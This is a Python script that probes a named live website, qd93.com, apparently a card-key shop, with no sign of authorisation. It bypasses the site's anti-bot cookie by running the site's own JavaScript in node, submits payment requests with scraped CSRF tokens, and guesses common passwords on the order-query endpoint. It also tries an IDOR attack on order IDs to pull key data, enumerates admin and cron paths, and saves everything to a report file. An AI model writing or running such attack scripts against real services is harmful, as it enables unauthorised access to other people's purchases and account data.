#!/usr/bin/env python3
"""Deep probe qd93.com rainbow faka."""
import hashlib
import json
import re
import subprocess
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://qd93.com/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
OUT = "/tmp/qd93_probe.json"

CSRF = re.compile(r'csrf_token\s*=\s*"([^"]+)"')
HASHSALT = re.compile(r"var hashsalt=(.+?);")
SHOWORDER = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
SEC_DEFEND = re.compile(
    r"setCookie\('sec_defend',(.+?)\);setCookie\('sec_defend_time'"
)


def compute_hashsalt(expr):
    proc = subprocess.run(
        ["node", "-e", f"console.log({expr.strip()})"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    return proc.stdout.strip() if proc.returncode == 0 else ""


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update(
        {
            "User-Agent": UA,
            "Referer": BASE,
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
    )
    for url in [BASE, BASE + "index.php", "http://qd93.com/"]:
        try:
            r = s.get(url, timeout=20, allow_redirects=True)
            m = SEC_DEFEND.search(r.text)
            if m:
                val = compute_hashsalt(m.group(1))
                if val:
                    s.cookies.set("sec_defend", val, domain="qd93.com")
            if len(r.text) > 5000:
                return s, r.text
        except Exception:
            pass
    return s, ""


def main():
    report = {"target": "qd93.com", "ts": time.strftime("%Y-%m-%d %H:%M:%S")}
    s, home = sess()
    report["home_len"] = len(home)
    report["cookies"] = dict(s.cookies)

    gc = s.get(BASE + "ajax.php?act=getcount", timeout=12)
    report["getcount"] = gc.text[:200]

    acts = ["query", "order", "pay", "search", "toollist"]
    report["ajax_matrix"] = {}
    for act in acts:
        r = s.get(BASE + f"ajax.php?act={act}", timeout=10)
        report["ajax_matrix"][act] = r.text[:80]

    # buy page scan
    buy = s.get(BASE, params={"mod": "buy", "tid": "1"}, timeout=15)
    report["buy_tid1_len"] = len(buy.text)
    csrf_m = CSRF.search(buy.text)
    hs_m = HASHSALT.search(buy.text)
    if csrf_m and hs_m:
        hs = compute_hashsalt(hs_m.group(1))
        pay = s.post(
            BASE + "ajax.php?act=pay",
            data={
                "tid": "1",
                "inputvalue": "123456789",
                "num": "1",
                "hashsalt": hs,
                "csrf_token": csrf_m.group(1),
            },
            timeout=15,
        )
        report["pay_resp"] = pay.text[:300]

    # query GET enumeration
    for page in [1, 2, 100]:
        q = s.get(BASE, params={"mod": "query", "page": str(page)}, timeout=15)
        so = SHOWORDER.findall(q.text)
        report[f"query_page_{page}"] = {
            "len": len(q.text),
            "showOrder": len(so),
            "sample": so[:3],
        }

    # query ajax with common pwds
    pwds = ["123456", "888888", "666666", "000000", "123456789", "qd93", "95lb"]
    for pwd in pwds:
        qr = s.post(
            BASE + "ajax.php?act=query",
            data={"type": "1", "content": "1", "pwd": pwd},
            timeout=12,
        )
        if SHOWORDER.search(qr.text) or "kminfo" in qr.text:
            report["pwd_hit"] = {"pwd": pwd, "resp": qr.text[:300]}
            break

    # order IDOR probe
    for oid in [1, 100, 1000, 28006]:
        for skey in ["", "123456", "test"]:
            orr = s.post(
                BASE + "ajax.php?act=order",
                data={"id": str(oid), "skey": skey},
                timeout=10,
            )
            if '"code":0' in orr.text and "kminfo" in orr.text:
                report["order_idor"] = {
                    "id": oid,
                    "skey": skey,
                    "resp": orr.text[:400],
                }

    # surface paths
    paths = [
        "toollogs.php",
        "cron.php",
        "api.php",
        "user/login.php",
        "?mod=query&data=1",
        "ajax.php?act=gettool",
    ]
    report["paths"] = {}
    for p in paths:
        r = s.get(BASE + p, timeout=12)
        report["paths"][p] = {"status": r.status_code, "len": len(r.text), "snip": r.text[:100]}

    with open(OUT, "w") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    print(json.dumps(report, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
